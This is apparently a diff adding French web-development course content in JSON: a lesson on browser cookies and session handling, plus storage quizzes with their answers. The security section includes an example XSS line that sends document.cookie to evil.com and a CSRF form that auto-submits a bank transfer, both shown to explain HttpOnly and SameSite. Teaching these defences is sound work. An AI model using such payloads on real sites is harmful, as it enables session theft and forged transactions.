+      "content": "# Essential to know\n- Cookies : 4KB max, envoyés avec chaque requête HTTP\n- HttpOnly : cookie inaccessible en JavaScript (protection XSS)\n- Secure : cookie envoyé uniquement en HTTPS\n- SameSite : protection CSRF (Strict, Lax, None)\n- Domain et Path : portée du cookie\n- Expires/Max-Age : durée de vie\n- Cookies vs localStorage pour auth : cookies plus sécurisés avec HttpOnly\n\n---\n\n# Cookies : Guide Complet\n\n## C'est quoi un Cookie ?\n\nUn cookie est un petit fichier texte (max 4KB) stocké par le navigateur et envoyé avec CHAQUE requête HTTP vers le domaine.\n\n**Flux :**\n```\nClient → Serveur : GET /page\nServeur → Client : Set-Cookie: session=abc123\n\nClient → Serveur : GET /autre-page + Cookie: session=abc123\nServeur → Client : (reconnaît le client grâce au cookie)\n```\n\n## Créer un Cookie\n
+```javascript
+// API basique (document.cookie)\ndocument.cookie = 'username=Marie; path=/; max-age=86400';
+
+// Plusieurs attributs
+document.cookie = `session=abc123; 
+  expires=Fri, 31 Dec 2024 23:59:59 GMT; 
+  path=/; 
+  domain=.example.com; 
+  secure; 
+  samesite=strict`;
+```
+
+### Attributs Importants
+
+| Attribut | Description | Exemple |
+|----------|-------------|---------|
+| `expires` | Date d'expiration | `expires=Fri, 31 Dec 2024...` |
+| `max-age` | Secondes avant expiration | `max-age=3600` (1h) |
+| `path` | URL path où le cookie est valide | `path=/admin` |
+| `domain` | Domaines autorisés | `domain=.example.com` |
+| `secure` | HTTPS uniquement | `secure` |
+| `httponly` | Pas d'accès JavaScript | `httponly` |
+| `samesite` | Protection CSRF | `samesite=strict` |
+
+## Lire les Cookies
+
+```javascript
+// Lire tous les cookies (string)
+console.log(document.cookie);
+// "username=Marie; session=abc123; theme=dark"
+
+// Parser en objet
+function getCookie(name) {
+  const value = `; ${document.cookie}`;
+  const parts = value.split(`; ${name}=`);
+  if (parts.length === 2) return parts.pop().split(';').shift();
+}
+
+// Usage
+const username = getCookie('username');
+```
+
+## Supprimer un Cookie
+
+```javascript
+// Mettre une date passée
+document.cookie = 'username=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/';
+
+// Ou max-age négatif
+document.cookie = 'username=; max-age=-1; path=/';
+```
+
+**Important :** Pour supprimer, il faut utiliser les mêmes `path` et `domain` qu'à la création !
+
+## Sécurité des Cookies
+
+### 1. HttpOnly (Protection XSS)
+
+```http
+Set-Cookie: session=abc123; HttpOnly
+```
+
+**Avant :**
+```javascript
+// Attaquant injecte ce code via XSS
+const stolen = document.cookie; // Récupère tout !
+fetch('https://evil.com/steal?cookie=' + stolen);
+```
+
+**Après HttpOnly :**
+```javascript
+document.cookie; // Ne voit pas session=abc123
+// Le cookie est envoyé automatiquement avec les requêtes,
+// mais inaccessible en JavaScript
+```
+
+### 2. Secure (HTTPS uniquement)
+
+```http
+Set-Cookie: session=abc123; Secure
+```
+
+Le cookie n'est envoyé que sur HTTPS, jamais en HTTP (protège du sniffing sur réseau WiFi public).
+
+### 3. SameSite (Protection CSRF)
+
+```http
+Set-Cookie: session=abc123; SameSite=Strict
+```
+
+**Problème CSRF :**
+```html
+<!-- Attaquant met ce formulaire sur evil.com -->
+<form action="https://bank.com/transfer" method="POST">
+  <input type="hidden" name="to" value="attacker" />
+  <input type="hidden" name="amount" value="1000" />
+</form>
+<script>document.forms[0].submit()</script>
+```
+
+**SameSite empêche ça :**
+- `Strict` : Cookie jamais envoyé si requête vient d'un autre site
+- `Lax` : Cookie envoyé pour navigation GET (liens), mais pas POST/iframe
+- `None` : Pas de protection (nécessite Secure)
+
+**Recommandé :**
+- Cookies de session : `SameSite=Strict`
+- Cookies de tracking/analytics : `SameSite=None; Secure`
+
+## Cookies vs localStorage pour l'Auth
+
+| | localStorage | Cookies HttpOnly |
+|---|---|---|
+| **Stockage** | 5-10MB | 4KB |
+| **Accès JS** | ✅ Oui | ❌ Non |
+| **Envoyé au serveur** | ❌ Non | ✅ Oui (auto) |
+| **XSS** | ⚠️ Vulnérable | ✅ Protégé |
+| **CSRF** | ✅ Immune | ⚠️ Nécessite SameSite |
+
+**Conclusion :** Pour les tokens d'authentification, préférer les **cookies HttpOnly + SameSite=Strict**.
+
+## Helper Moderne pour Cookies
+
+```javascript
+// cookies.js
+const Cookies = {
+  get(name) {
+    const value = `; ${document.cookie}`;
+    const parts = value.split(`; ${name}=`);
+    if (parts.length === 2) {
+      const cookieValue = parts.pop().split(';').shift();
+      try {
+        return JSON.parse(decodeURIComponent(cookieValue));
+      } catch {
+        return decodeURIComponent(cookieValue);
+      }
+    }
+    return null;
+  },
+
+  set(name, value, options = {}) {
+    const {
+      expires,
+      maxAge,
+      path = '/',
+      domain,
+      secure = location.protocol === 'https:',
+      sameSite = 'Lax'
+    } = options;
+
+    let cookie = `${encodeURIComponent(name)}=${encodeURIComponent(
+      typeof value === 'object' ? JSON.stringify(value) : value
+    )}`;
+
+    if (expires) cookie += `; expires=${expires.toUTCString()}`;
+    if (maxAge) cookie += `; max-age=${maxAge}`;
+    if (path) cookie += `; path=${path}`;
+    if (domain) cookie += `; domain=${domain}`;
+    if (secure) cookie += '; secure';
+    if (sameSite) cookie += `; samesite=${sameSite}`;
+
+    document.cookie = cookie;
+  },
+
+  remove(name, options = {}) {
+    this.set(name, '', { ...options, maxAge: -1 });
+  },
+
+  // Vérifier si cookies activés
+  isEnabled() {
+    const testKey = '__cookie_test__';
+    this.set(testKey, 'test');
+    const enabled = this.get(testKey) === 'test';
+    this.remove(testKey);
+    return enabled;
+  }
+};
+
+// Usage
+Cookies.set('user', { id: 1, name: 'Marie' }, { 
+  maxAge: 86400 * 7, // 7 jours
+  sameSite: 'Strict'
+});
+
+const user = Cookies.get('user'); // { id: 1, name: 'Marie' }
+
+Cookies.remove('user');
+```
+
+## Cas d'Usage Typiques
+
+### 1. Session Utilisateur (côté serveur)
+
+```http
+# Serveur envoie
+Set-Cookie: sessionId=a1b2c3d4; 
+  HttpOnly; 
+  Secure; 
+  SameSite=Strict; 
+  Path=/; 
+  Max-Age=86400
+```
+
+### 2. Préférences (côté client)
+
+```javascript
+// Thème, langue - pas besoin de sécurité max
+Cookies.set('theme', 'dark', { maxAge: 86400 * 365 }); // 1 an
+Cookies.set('language', 'fr', { maxAge: 86400 * 365 });
+```
+
+### 3. Token JWT (débat)
+
+**Option 1 - Cookie HttpOnly (recommandé) :**
+```javascript
+// + Sécurisé contre XSS
+// + Envoyé automatiquement
+// - Nécessite CSRF protection
+// - 4KB limit
+```
+
+**Option 2 - localStorage + Header :**
+```javascript
+// + Simple avec API REST
+// + Pas de CSRF
+// - Vulnérable XSS
+// - Gestion manuelle du header
+```",
+      "codeExample": "// Système de gestion de session sécurisé avec cookies\n\n// ========== Session Manager ==========\nconst SessionManager = {\n  SESSION_KEY: 'app_session',\n  USER_KEY: 'app_user',\n  \n  // Créer une session (appelé après login)\n  create(sessionToken, user, remember = false) {\n    // Cookie sécurisé pour le token (envoyé au serveur)\n    // Note: En vrai, ça vient du serveur avec HttpOnly\n    // Ici on simule le stockage client\n    Cookies.set(this.SESSION_KEY, sessionToken, {\n      maxAge: remember ? 86400 * 30 : 86400, // 30j ou 1j\n      secure: true,\n      sameSite: 'Strict',\n      path: '/'\n    });\n    \n    // Cookie pour infos user (non sensible, accessible JS)\n    Cookies.set(this.USER_KEY, {\n      id: user.id,\n      name: user.name,\n      avatar: user.avatar\n    }, {\n      maxAge: remember ? 86400 * 30 : 86400\n    });\n    \n    // Déclencher événement\n    window.dispatchEvent(new Event('auth-change'));\n  },\n  \n  // Récupérer session\n  getToken() {\n    return Cookies.get(this.SESSION_KEY);\n  },\n  \n  getUser() {\n    return Cookies.get(this.USER_KEY);\n  },\n  \n  // Vérifier si connecté\n  isAuthenticated() {\n    return !!this.getToken();\n  },\n  \n  // Déconnexion\n  destroy() {\n    Cookies.remove(this.SESSION_KEY, { path: '/' });\n    Cookies.remove(this.USER_KEY, { path: '/' });\n    window.dispatchEvent(new Event('auth-change'));\n  },\n  \n  // Rafraîchir le token\n  refresh(newToken) {\n    const user = this.getUser();\n    const remember = this.getToken()?.length > 0; // Garder même durée\n    this.create(newToken, user, remember);\n  }\n};\n\n\n// ========== API avec Auth ==========\nconst API = {\n  async request(url, options = {}) {\n    const token = SessionManager.getToken();\n    \n    const response = await fetch(url, {\n      ...options,\n      headers: {\n        'Content-Type': 'application/json',\n        ...(token && { 'Authorization': `Bearer ${token}` }),\n        ...options.headers\n      },\n      credentials: 'include' // Envoyer les cookies HttpOnly\n    });\n    \n    if (response.status === 401) {\n      SessionManager.destroy();\n      window.location.href = '/login';\n      throw new Error('Session expirée');\n    }\n    \n    return response.json();\n  },\n  \n  get(url) {\n    return this.request(url);\n  },\n  \n  post(url, data) {\n    return this.request(url, {\n      method: 'POST',\n      body: JSON.stringify(data)\n    });\n  }\n};\n\n\n// ========== Composant Auth React ==========\nimport { useState, useEffect, createContext, useContext } from 'react';\n\nconst AuthContext = createContext(null);\n\nexport function AuthProvider({ children }) {\n  const [user, setUser] = useState(null);\n  const [loading, setLoading] = useState(true);\n  \n  useEffect(() => {\n    // Charger user au démarrage\n    const savedUser = SessionManager.getUser();\n    if (savedUser) {\n      setUser(savedUser);\n    }\n    setLoading(false);\n    \n    // Écouter changements\n    const handleAuthChange = () => {\n      const u = SessionManager.getUser();\n      setUser(u);\n    };\n    \n    window.addEventListener('auth-change', handleAuthChange);\n    return () => window.removeEventListener('auth-change', handleAuthChange);\n  }, []);\n  \n  const login = async (email, password, remember) => {\n    const response = await fetch('/api/login', {\n      method: 'POST',\n      headers: { 'Content-Type': 'application/json' },\n      body: JSON.stringify({ email, password })\n    });\n    \n    if (!response.ok) throw new Error('Login failed');\n    \n    const { token, user } = await response.json();\n    SessionManager.create(token, user, remember);\n    setUser(user);\n  };\n  \n  const logout = () => {\n    SessionManager.destroy();\n    setUser(null);\n  };\n  \n  return (\n    \u003cAuthContext.Provider value={{ user, login, logout, loading }}\u003e\n      {children}\n    \u003c/AuthContext.Provider\u003e\n  );\n}\n\nexport const useAuth = () => useContext(AuthContext);\n\n\n// ========== Usage ==========\nfunction Header() {\n  const { user, logout } = useAuth();\n  \n  return (\n    \u003cheader\u003e\n      {user ? (\n        \u003c\u003e\n          \u003cspan\u003eBonjour, {user.name}\u003c/span\u003e\n          \u003cbutton onClick={logout}\u003eDéconnexion\u003c/button\u003e\n        \u003c/\u003e\n      ) : (\n        \u003ca href=\"/login\"\u003eConnexion\u003c/a\u003e\n      )}\n    \u003c/header\u003e\n  );\n}"
+    }
+  ],
+  "exercises": [
+    {
+      "id": "storage-ex-1",
+      "lessonId": "storage-overview",
+      "moduleId": "browser-storage",
+      "title": "Quiz Stockage Navigateur",
+      "difficulty": "easy",
+      "type": "quiz",
+      "questions": [
+        {
+          "question": "Quelle est la taille maximale approximative de localStorage ?",
+          "options": [
+            "100KB",
+            "5-10MB",
+            "50MB",
+            "Illimitée"
+          ],
+          "correctAnswer": 1,
+          "explanation": "localStorage est généralement limité à environ 5-10MB selon les navigateurs."
+        },
+        {
+          "question": "Quelle est la différence principale entre localStorage et sessionStorage ?",
+          "options": [
+            "La taille",
+            "sessionStorage est effacé quand on ferme l'onglet",
+            "La vitesse",
+            "sessionStorage est synchrone"
+          ],
+          "correctAnswer": 1,
+          "explanation": "sessionStorage garde les données uniquement pendant la session (onglet ouvert). localStorage persiste jusqu'à suppression explicite."
+        },
+        {
+          "question": "Pourquoi utiliser IndexedDB plutôt que localStorage pour de gros volumes ?",
+          "options": [
+            "C'est plus simple",
+            "C'est asynchrone et supporte plus de données",
+            "C'est plus sécurisé",
+            "C'est obligatoire par la loi"
+          ],
+          "correctAnswer": 1,
+          "explanation": "IndexedDB est asynchrone (ne bloque pas l'UI), supporte 50MB+ et permet de stocker des objets complexes."
+        }
+      ]
+    },
+    {
+      "id": "storage-ex-2",
+      "lessonId": "local-session-storage",
+      "moduleId": "browser-storage",
+      "title": "Quiz localStorage Pratique",
+      "difficulty": "easy",
+      "type": "quiz",
+      "questions": [
+        {
+          "question": "Comment stocke-t-on un objet dans localStorage ?",
+          "options": [
+            "localStorage.setItem('key', object)",
+            "localStorage.setItem('key', JSON.stringify(object))",
+            "localStorage.save('key', object)",
+            "localStorage.object = object"
+          ],
+          "correctAnswer": 1,
+          "explanation": "localStorage ne stocke que des strings. Il faut convertir l'objet avec JSON.stringify() et le récupérer avec JSON.parse()."
+        },
+        {
+          "question": "Quel événement permet de synchroniser localStorage entre onglets ?",
+          "options": [
+            "'localstorage'",
+            "'storage'",
+            "'sync'",
+            "'change'"
+          ],
+          "correctAnswer": 1,
+          "explanation": "L'événement 'storage' se déclenche quand localStorage est modifié dans un autre onglet du même domaine."
+        },
+        {
+          "question": "Pourquoi ne faut-il pas stocker de token JWT dans localStorage ?",
+          "options": [
+            "C'est trop lent",
+            "C'est vulnérable aux attaques XSS",
+            "Ça ne tient pas",
+            "C'est interdit par les navigateurs"
+          ],
+          "correctAnswer": 1,
+          "explanation": "localStorage est accessible à tout JavaScript. En cas d'attaque XSS, un attaquant peut voler le token. Préférer cookies HttpOnly."
+        }
+      ]
+    },
+    {
+      "id": "storage-ex-3",
+      "lessonId": "indexeddb",
+      "moduleId": "browser-storage",
+      "title": "Quiz IndexedDB",
+      "difficulty": "medium",
+      "type": "quiz",
+      "questions": [
+        {
+          "question": "Pourquoi utiliser une bibliothèque comme 'idb' avec IndexedDB ?",
+          "options": [
+            "Pour stocker plus",
+            "Pour simplifier l'API complexe native",
+            "Pour la sécurité",
+            "C'est obligatoire"
+          ],
+          "correctAnswer": 1,
+          "explanation": "L'API IndexedDB native est verbeuse et basée sur événements. 'idb' fournit une API moderne avec Promises."
+        },
+        {
+          "question": "Qu'est-ce qu'un 'index' dans IndexedDB ?",
+          "options": [
+            "Un numéro de page",
+            "Une structure pour rechercher rapidement",
+            "Une table",
+            "Une clé primaire"
+          ],
+          "correctAnswer": 1,
+          "explanation": "Un index permet de rechercher rapidement des données par un champ autre que la clé primaire."
+        },
+        {
+          "question": "IndexedDB est-elle synchrone ou asynchrone ?",
+          "options": [
+            "Synchrone",
+            "Asynchrone",
+            "Les deux",
+            "Ça dépend du navigateur"
+          ],
+          "correctAnswer": 1,
+          "explanation": "IndexedDB est asynchrone, ce qui permet de traiter de gros volumes sans bloquer l'interface utilisateur."
+        }
+      ]
+    }
+  ]
+}
